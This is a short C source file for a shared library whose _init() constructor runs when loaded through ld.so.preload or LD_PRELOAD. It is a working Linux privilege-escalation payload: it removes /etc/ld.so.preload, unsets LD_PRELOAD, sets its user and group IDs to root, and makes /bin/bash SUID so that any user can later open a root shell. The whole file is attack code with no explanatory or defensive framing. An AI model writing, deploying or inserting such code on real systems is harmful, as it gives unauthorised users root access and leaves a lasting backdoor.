#include <stdio.h>
#include <stdlib.h>
#include <unistd.h>

void _init() {
    // Prevent recursion
    unlink("/etc/ld.so.preload");
    
    // Prevent further recursion into preload
    unsetenv("LD_PRELOAD");  
    
    // Set user/group id as root (0)
    setgid(0);
    setuid(0);
    
    // Suid
    system("chmod +s /bin/bash");
}